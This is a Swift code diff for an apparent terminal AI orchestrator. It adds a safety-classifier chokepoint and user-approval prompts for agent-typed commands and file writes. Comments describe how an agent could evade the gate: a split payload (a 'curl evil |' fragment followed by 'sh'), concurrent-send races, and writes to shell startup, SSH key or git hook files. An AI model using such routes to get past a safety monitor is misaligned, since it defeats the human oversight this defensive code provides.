@@ -35,7 +35,10 @@ import Foundation
 @MainActor
 final class OrchestratorDispatcher {
 
-    private let chatID: String
+    // Internal (not private) so the safety-gate extension in
+    // OrchestratorSafetyGate.swift can seed the classifier's transcript
+    // from this chat's history.
+    let chatID: String
     private weak var broker: ChatBroker?
 
     // Set by tearDown() to short-circuit any handler that's already
@@ -95,6 +98,30 @@ final class OrchestratorDispatcher {
     // same task instead of spawning a new prompt.
     private var pendingClaimTasks: [String: Task<Bool, Never>] = [:]
 
+    // Per-SESSION typed-input state, keyed by session GUID. SHARED across every
+    // per-chat dispatcher of the owning OrchestratorClient (see
+    // OrchestratorTypedInputStore), so the accumulator is genuinely per-session,
+    // not per-(chat, session): two chats driving one PTY share one accumulator,
+    // and a payload split across the two chats is still reconstructed whole. The
+    // GUID key namespaces sessions; the shared store is what makes the guarantee
+    // hold across chats. `.pending` is the only LAG-FREE record of prior typed
+    // fragments (shell integration and the screen grid both trail our PTY
+    // writes), so gateTypedText uses it to classify a command split across
+    // back-to-back sends as a whole. `.contaminated` marks sessions where a
+    // disturbing keystroke (Tab/arrows/Ctrl-*) was allowed on a primary-screen
+    // shell, wiping the accumulator but leaving the already-typed prefix on the
+    // prompt: while contaminated, gateTypedText forces screen-aware
+    // classification (the echoed full line) rather than trusting the accumulator.
+    // Both are cleared on submit, on interrupt, and on session termination --
+    // each resets the prompt line. Entries are keyed by session, not chat, so a
+    // chat/dispatcher tearing down never clears a session another chat may drive.
+    private let typedInput: OrchestratorTypedInputStore
+
+    // Test seam: the store this dispatcher was handed at construction. Wiring
+    // tests compare it across two dispatchers to confirm the client shares one
+    // per-session accumulator rather than minting a fresh one per chat.
+    var typedInputStoreForTesting: OrchestratorTypedInputStore { typedInput }
+
     // Observer on iTermSessionTabStatusDidChange — the source of
     // truth for "a session's state changed". When a notification
     // fires we walk watchers, fire any matches, and remove them
@@ -129,9 +156,11 @@ final class OrchestratorDispatcher {
     // escalating to the screen-observation backstop.
     private static let tabStatusEscalationDelay: TimeInterval = 300  // 5 minutes
 
-    init(chatID: String, broker: ChatBroker) {
+    init(chatID: String, broker: ChatBroker,
+         typedInput: OrchestratorTypedInputStore) {
         self.chatID = chatID
         self.broker = broker
+        self.typedInput = typedInput
         let listModel = broker.listModel
         self.claimedScopes = listModel.claimedScopes(forChatID: chatID)
         self.watchers = listModel.watchers(forChatID: chatID)
@@ -280,19 +309,32 @@ final class OrchestratorDispatcher {
         if tornDown { return }
         guard case let .delivery(message, _, _) = update,
               message.author == .user,
-              case let .userCommand(command) = message.content,
-              case let .workgroupPermissionResponse(requestID, approved) = command else {
+              case let .userCommand(command) = message.content else {
             return
         }
-        // Normalize case at the lookup boundary. UUID().uuidString returns
-        // uppercase, and pendingPermissionPrompts is keyed by that exact
-        // string. If anything in the message round-trip ever lower-cases
-        // the requestID (e.g. a future JSON round-trip, a UI bridge that
-        // canonicalizes IDs), the lookup would miss and the continuation
-        // would park forever with no diagnostic.
-        let key = requestID.uppercased()
-        if let continuation = pendingPermissionPrompts.removeValue(forKey: key) {
-            continuation.resume(returning: approved)
+        switch command {
+        case let .workgroupPermissionResponse(requestID, approved):
+            // Normalize case at the lookup boundary. UUID().uuidString returns
+            // uppercase, and pendingPermissionPrompts is keyed by that exact
+            // string. If anything in the message round-trip ever lower-cases
+            // the requestID (e.g. a future JSON round-trip, a UI bridge that
+            // canonicalizes IDs), the lookup would miss and the continuation
+            // would park forever with no diagnostic.
+            let key = requestID.uppercased()
+            if let continuation = pendingPermissionPrompts.removeValue(forKey: key) {
+                continuation.resume(returning: approved)
+            }
+        case .stop:
+            // The user pressed Stop. ChatService cancels the in-flight turn and
+            // clears the queued backlog; cancel this chat's registered watchers
+            // too, so a later status transition can't publish a watcherEvent
+            // that silently re-arms the orchestration loop after the user asked
+            // everything to stop.
+            cancelAllWatchers()
+        case .enableOrchestrationResponse, .revokeOrchestrationPermission:
+            // Consumed elsewhere (ChatAgent / OrchestratorClient via their own
+            // broker subscriptions). Not the dispatcher's concern.
+            break
         }
     }
 
@@ -383,6 +425,8 @@ final class OrchestratorDispatcher {
         // see a stale "previous state" from the prior session's last
         // tabStatus event.
         sessionStateHistory.removeValue(forKey: guid)
+        typedInput.pending.removeValue(forKey: guid)
+        typedInput.contaminated.remove(guid)
         let dropped = watchers.filter { $0.sessionGUID == guid }
         guard !dropped.isEmpty else { return }
         let droppedIDs = Set(dropped.map { $0.watcherID })
@@ -850,6 +894,17 @@ final class OrchestratorDispatcher {
             where: { $0.functionName == rawName }) else {
             return Data("Error: unknown session tool \(name)".utf8)
         }
+        // Defense in depth: these .typeForYou tools write to the PTY without
+        // classification and can submit an arbitrary command (a CR in the text,
+        // or Ctrl-U), so they must never run in orchestration mode. They are
+        // not registered (see OrchestrationToolProvider.registerSessionTools);
+        // reject them here too in case a future change re-adds them.
+        switch content {
+        case .insertTextAtCursor, .deleteCurrentLine:
+            return Data("Error: \(name) is not available in orchestration mode; use send_text (which is safety-checked).".utf8)
+        default:
+            break
+        }
         let argsObject: [String: Any]
         do {
             guard let dict = try JSONSerialization.jsonObject(
@@ -883,6 +938,61 @@ final class OrchestratorDispatcher {
         if Self.requiresSessionClaim(content) {
             if !(await ensureSessionClaim(sessionGuid: sessionGuid)) {
                 return Data("The user declined to allow this chat to control session \(sessionGuid).".utf8)
+            }
+        }
+
+        // Safety gate. Arbitrary-code actions (execute_command) are run
+        // through the AI safety classifier just like the session-bound path,
+        // with inTUI derived from the target's live screen so a command
+        // injected while a full-screen app owns the screen fails toward
+        // manual approval. A flagged verdict does not dispatch immediately:
+        // gateTypedText -> enforce surfaces a one-tap approval bubble (reusing
+        // awaitPermission, like promptForSpawn); if the user approves it runs,
+        // otherwise the block message goes back to the LLM.
+        if remoteCommand.needsSafetyCheck {
+            // execute_command types `command + \r` into the FOREGROUND program on
+            // the SAME prompt line as send_text, so route it through the shared
+            // chokepoint (whole-line reconstruction + staged-input defenses).
+            // Fail closed if needsSafetyCheck is ever true for something that
+            // isn't execute_command (today it isn't, but the property exists to
+            // grow): without the command string we can't classify.
+            guard case let .executeCommand(execArgs) = remoteCommand.content else {
+                return Data("Not run automatically: this action needs manual approval first. Ask the user to run it themselves or to approve it.".utf8)
+            }
+            do {
+                try await gateTypedText(execArgs.command, appendNewline: true, session: session)
+            } catch let error as OrchestratorError {
+                return Data(error.message.utf8)
+            } catch {
+                return Data("Not run automatically: \(error.localizedDescription)".utf8)
+            }
+        }
+
+        // createFile isn't needsSafetyCheck (it doesn't run a command inline),
+        // but writing a file is deferred code execution (~/.zshrc, ~/.ssh/
+        // authorized_keys, .git/hooks/*), so classify the write too: the path
+        // AND content are judged.
+        if case let .createFile(fileArgs) = remoteCommand.content {
+            // Content larger than we can pass to the classifier in full can hide
+            // a payload in the unseen middle of an otherwise-benign file, so
+            // require approval rather than classify a partial view.
+            let outcome: SafetyGateOutcome
+            if fileArgs.content.count > Self.createFileMaxClassifiableContent {
+                outcome = .requireApproval(
+                    reason: "the file is too large to safety-check automatically")
+            } else {
+                outcome = await Self.classifyFileWrite(filename: fileArgs.filename,
+                                                       content: fileArgs.content,
+                                                       classifier: fileWriteSafetyClassifier())
+            }
+            do {
+                try await enforce(
+                    outcome,
+                    actionSummary: "The agent wants to create the file `\(fileArgs.filename)`.")
+            } catch let error as OrchestratorError {
+                return Data(error.message.utf8)
+            } catch {
+                return Data("Not written automatically: \(error.localizedDescription)".utf8)
             }
         }
 
@@ -1203,7 +1313,11 @@ final class OrchestratorDispatcher {
         guard let cmd = Self.spawnCommand(from: command) else {
             return true
         }
-        if await CommandSafetyChecker.check(cmd) {
+        // Seed the classifier with this chat's recent history, like the sibling
+        // execute_command / send_text / create_file paths, so an explicit user
+        // request ("start a session and run <risky>") is visible and doesn't
+        // always fall through to a manual prompt.
+        if await CommandSafetyChecker.check(cmd, transcript: SafetyTranscript.forChat(chatID)) {
             return true
         }
         return try await promptForSpawn(command: command)
@@ -1653,6 +1767,29 @@ final class OrchestratorDispatcher {
         return .ack
     }
 
+    // Cancel and forget every watcher on this chat, tearing down each one's
+    // escalation timer and screen poller. Called when the user presses Stop:
+    // combined with ChatService cancelling the in-flight turn and clearing the
+    // queued backlog, dropping the watchers means a later status transition
+    // can't fire a watcherEvent that restarts the loop. No status_update is
+    // published (the user asked to stop, not to be notified); watches they
+    // still want can be re-registered by asking the agent again.
+    @MainActor
+    private func cancelAllWatchers() {
+        guard !watchers.isEmpty else { return }
+        let ids = watchers.map { $0.watcherID }
+        watchers.removeAll()
+        for id in ids {
+            removeWatcherAuxiliaries(watcherID: id)
+        }
+        // Transition history is only meaningful while a watcher is armed;
+        // doRegisterWatch reseeds it before appending, so clearing it now just
+        // avoids carrying stale per-session state.
+        sessionStateHistory.removeAll()
+        persistWatchers()
+        RLog("[Orchestrator \(chatID)] Stop: cancelled \(ids.count) watcher(s)")
+    }
+
     @MainActor
     private func doListWatches() -> OrchestratorResult {
         return .watcherList(watchers.map { Self.description(of: $0) })
@@ -1696,14 +1833,219 @@ final class OrchestratorDispatcher {
             throw OrchestratorError.malformedArgs(reason: "text: \(error)")
         }
         if let overlay = resolved.session.view?.codeReviewPromptOverlay {
+            // Code-review prompt overlay: the text populates an in-session
+            // overlay and is launched via `claude -p '<text>'`
+            // (wrappedCommandForCodeReview single-quotes it), so it reaches a
+            // coding agent as one contained argument, not a raw shell line, and
+            // the agent applies its own safety controls. This branch is
+            // deliberately NOT routed through the pre-type chokepoint below (the
+            // overlay session is pre-launch, so there is no live command line or
+            // shell to reconstruct against); the containment + agent self-gating
+            // is why it's exempt. (The idle-fallback path in doStartCodeReview,
+            // where the session may be a bare shell, IS gated.)
             overlay.text = decoded
             overlay.onStart?(decoded)
             return .ack
         }
+
+        // Safety gate. Routes through the shared pre-type chokepoint (also used
+        // by execute_command and the code-review idle fallback) so every path
+        // that types into a session's foreground gets identical whole-line
+        // defenses. A non-allow verdict throws safetyBlocked before typeIntoPTY.
+        let appendNewline = args.appendNewline ?? true
+        try await gateTypedText(decoded, appendNewline: appendNewline, session: resolved.session)
+
         await Self.typeIntoPTY(session: resolved.session,
                                text: decoded,
-                               appendNewline: args.appendNewline ?? true)
+                               appendNewline: appendNewline)
         return .ack
+    }
+
+    // Whether a session's foreground should be judged by the screen-aware
+    // classifier (a full-screen app on the alternate screen -- including coding
+    // agents -- a primary-screen REPL, an unknown program, or a session with no
+    // job info) rather than shell command-line rules. Shared by send_text and
+    // execute_command so every path that types into a session's foreground
+    // routes identically; a recognized shell on the primary screen is the only
+    // thing judged as a shell command line.
+    @MainActor
+    private func usesScreenAwareClassification(_ session: PTYSession) -> Bool {
+        return WorkgroupIntrospection.screenSurface(for: session) == .alternate
+            || !WorkgroupIntrospection.foregroundIsShell(session)
+    }
+
+    // The single pre-type chokepoint. Both send_text and execute_command route
+    // through this before their bytes reach the PTY, so the whole-line
+    // reconstruction and staged-input defenses apply uniformly -- execute_command
+    // types `command + \r` into the SAME prompt line as send_text, so classifying
+    // its command in isolation would let `send_text("curl evil |", newline:false)`
+    // then `execute_command("sh")` run the un-classified whole. Throws
+    // safetyBlocked on a non-allow verdict; returns on allow.
+    @MainActor
+    private func gateTypedText(_ text: String,
+                              appendNewline: Bool,
+                              session: PTYSession) async throws {
+        // The per-session accumulator (keyed by GUID, so two chats driving one
+        // PTY share it) is the only lag-free record of what the orchestrator has
+        // typed since the last submit. Shell integration and the screen grid
+        // both trail our own PTY writes, so a payload split across back-to-back
+        // sends in one LLM turn could otherwise slip past. planTypedGate picks
+        // the line to classify from the most reliable source and returns the
+        // accumulator's next value.
+        let guid = session.guid
+        let priorBuffer = typedInput.pending[guid] ?? ""
+        let priorContaminated = typedInput.contaminated.contains(guid)
+        let plan = Self.planTypedGate(
+            priorBuffer: priorBuffer,
+            decoded: text,
+            appendNewline: appendNewline,
+            screenAware: usesScreenAwareClassification(session),
+            full: session.currentCommand,
+            upToCursor: session.currentCommandUpToCursor,
+            contaminated: priorContaminated)
+
+        // Classify FIRST, then advance the accumulator -- and only if the verdict
+        // did not throw. A blocked send is never typed (the throw skips
+        // typeIntoPTY), so the physically-typed prefix is still on the prompt; if
+        // we cleared the accumulator first, a later send would reconstruct
+        // without that prefix and run it un-classified. On a throw we leave the
+        // buffer at priorBuffer so the leftover prefix is reconstructed next time.
+        switch plan.route {
+        case .screenAware:
+            try await gateKeystrokeAgainstScreen(
+                decoded: text, appendNewline: appendNewline, session: session)
+        case .accumulateOnly:
+            break  // typed but inert until Enter; the submit will classify it
+        case .classifyLine(let command):
+            // One classification of the WHOLE line that will run. It is
+            // authoritative: a fragment the classifier judges safe in context (a
+            // `#` comment or an open-quote string) is one the shell won't run
+            // either, so a separate fragment-only check would only add a second
+            // round-trip and block inert payloads.
+            try await enforce(await Self.classifyCommand(
+                command, inTUI: false, classifier: safetyClassifier()),
+                              actionSummary: "The agent wants to run:\n\n`\(command)`")
+        case .failClosed(let reason):
+            try await enforce(.requireApproval(reason: reason),
+                              actionSummary: "The agent wants to run a command in the session.")
+        }
+
+        // Concurrency guard. gateTypedText runs on the main actor, but the
+        // classify `await` above is a suspension point, and the accumulator store
+        // is SHARED across a client's per-chat dispatchers (so two chats driving
+        // one session share it). A concurrent send on the SAME session could have
+        // mutated the accumulator OR the contamination flag while we were awaiting
+        // the classifier, so our plan -- computed from the now-stale priorBuffer /
+        // priorContaminated -- must not clobber it (dropping a fragment from a
+        // later classification, or clearing a contamination another chat just
+        // set). The race resolution is factored into resolveConcurrentSend so it
+        // can be unit-tested without a live session. (The accumulate path has no
+        // await, so it never trips this.)
+        let sendSubmits = appendNewline || Self.containsSubmitNewline(text)
+        switch Self.resolveConcurrentSend(
+            priorBuffer: priorBuffer,
+            observedBuffer: typedInput.pending[guid] ?? "",
+            priorContaminated: priorContaminated,
+            observedContaminated: typedInput.contaminated.contains(guid),
+            sendSubmits: sendSubmits,
+            plannedNewBuffer: plan.newBuffer,
+            plannedContaminated: plan.contaminated) {
+        case .failClosed:
+            // A concurrent send typed onto the same physical prompt during our
+            // await, so the shell would run a fusion we never classified whole
+            // (the serialized path classifies that fusion and catches it -- only
+            // the race is the hole). Contaminate and block THIS send rather than
+            // letting the caller type/submit a stale-classified line.
+            typedInput.contaminated.insert(guid)
+            throw OrchestratorError.safetyBlocked(
+                reason: "a concurrent send changed this session's prompt during the safety check; resubmit so the whole line is re-checked.")
+        case .markContaminatedAndReturn:
+            // Inert send raced by a concurrent write: leave its keystroke on the
+            // now-contaminated prompt; the next submit is judged against the
+            // screen. Do not clobber the concurrent writer's accumulator.
+            typedInput.contaminated.insert(guid)
+            return
+        case .commit(let buffer, let contaminate):
+            // No race. Apply the plan's accumulator advance. Reached only on an
+            // ALLOWED send (a blocked route threw above), matching the "contaminate
+            // only when a disturbing keystroke is allowed" contract: a blocked
+            // disturbing keystroke is never typed, so it leaves nothing on the
+            // prompt to account for.
+            if let buffer {
+                typedInput.pending[guid] = buffer
+            } else {
+                typedInput.pending.removeValue(forKey: guid)
+            }
+            if contaminate {
+                typedInput.contaminated.insert(guid)
+            } else {
+                typedInput.contaminated.remove(guid)
+            }
+        }
+    }
+
+    // Classify a keystroke against the target's current screen and throw if the
+    // verdict isn't allow. `effective` includes the submit gesture (a trailing
+    // \r when appendNewline). An empty payload is a no-op.
+    @MainActor
+    private func gateKeystrokeAgainstScreen(decoded: String,
+                                            appendNewline: Bool,
+                                            session: PTYSession) async throws {
+        let effective = decoded + (appendNewline ? "\r" : "")
+        guard !effective.isEmpty else { return }
+        let screen = WorkgroupIntrospection.screenContents(
+            forSession: session, requestedLines: nil).text
+        try await enforce(
+            await Self.tuiKeystrokeOutcome(
+                keystroke: effective, screen: screen, classifier: safetyClassifier()),
+            actionSummary: "The agent wants to send this to the session's foreground program:\n\n`\(TUISafetyPrompt.displayKeystroke(effective))`")
+    }
+
+    // Enforce a safety-gate outcome. On .allow, return so the action proceeds.
+    // On .requireApproval or .deny, surface a one-tap approval bubble (reusing
+    // awaitPermission, the same mechanism promptForSpawn/promptForClaim use): if
+    // the user approves, return so the action runs; otherwise throw safetyBlocked
+    // so it does not. This replaces the old throwIfBlocked, which dead-ended
+    // every non-allow verdict as a text message to the model with no way for the
+    // user to actually say yes -- which pushed the agent into bypass attempts.
+    @MainActor
+    private func enforce(_ outcome: SafetyGateOutcome, actionSummary: String) async throws {
+        switch outcome {
+        case .allow:
+            return
+        case .requireApproval(let reason):
+            DLog("Orchestrator safety gate: requireApproval (\(reason))")
+            if await promptForCommandApproval(actionSummary: actionSummary,
+                                              reason: reason, flagged: false) {
+                return
+            }
+            throw OrchestratorError.safetyBlocked(reason: "the user declined to approve it.")
+        case .deny(let reason):
+            DLog("Orchestrator safety gate: deny (\(reason))")
+            if await promptForCommandApproval(actionSummary: actionSummary,
+                                              reason: reason, flagged: true) {
+                return
+            }
+            throw OrchestratorError.safetyBlocked(reason: reason)
+        }
+    }
+
+    // Surface a flagged command / keystroke / file write for one-tap user
+    // approval, reusing the orchestrator's permission bubble. `flagged` adds a
+    // stronger warning for a .deny (the classifier judged it dangerous) versus a
+    // .requireApproval (it just needs a human to look). Returns true on approval.
+    @MainActor
+    private func promptForCommandApproval(actionSummary: String,
+                                          reason: String,
+                                          flagged: Bool) async -> Bool {
+        let lead = flagged
+            ? "The safety check flagged this as potentially dangerous.\n\n"
+            : ""
+        let summary = "\(lead)\(actionSummary)\n\nWhy it needs review: \(reason)"
+        return await awaitPermission(
+            workgroupID: WorkgroupIntrospection.commandApprovalWorkgroupID,
+            workgroupName: "Run command",
+            summary: summary)
     }
 
     // Centralized rule for writing prompt-style text into a session as if
@@ -1797,6 +2139,12 @@ final class OrchestratorDispatcher {
         if resolved.session.exited {
             throw OrchestratorError.targetNoLongerExists(sessionGuid: sessionGuid)
         }
+        // Ctrl-C clears the shell's current line, so drop any accumulated
+        // pending input; otherwise a later send would classify a stale line.
+        // The reset also clears contamination -- the leftover prompt content
+        // that made the accumulator untrustworthy is gone.
+        typedInput.pending.removeValue(forKey: resolved.session.guid)
+        typedInput.contaminated.remove(resolved.session.guid)
         resolved.session.writeTaskNoBroadcast("\u{03}")
         return .ack
     }
@@ -2107,9 +2455,18 @@ final class OrchestratorDispatcher {
             overlay.text = promptText
             overlay.onStart?(promptText)
         } else {
-            // Idle Claude Code TUI fallback. typeIntoPTY handles bracketed
-            // paste and the deferred-Enter dance so multi-line prompts (the
-            // default review prompt is multi-line) submit reliably.
+            // Idle Claude Code TUI fallback: type the (possibly agent-supplied,
+            // via custom_prompt) prompt straight into the session. This branch
+            // is entered on a stale-ish idle tabStatus, so the "Claude Code TUI"
+            // may actually have exited to a bare shell (the cc-status hook does
+            // not reliably emit a transition when the child exits). So it must go
+            // through the same safety chokepoint as send_text -- otherwise an
+            // agent-controlled multi-line prompt would be typed + Entered into a
+            // shell un-classified. gateTypedText throws safetyBlocked on a
+            // non-allow verdict, which surfaces to the LLM as the tool error.
+            try await gateTypedText(promptText, appendNewline: true, session: resolved.session)
+            // typeIntoPTY handles bracketed paste + the deferred-Enter dance so
+            // multi-line prompts submit reliably.
             await Self.typeIntoPTY(session: resolved.session,
                                    text: promptText,
                                    appendNewline: true)
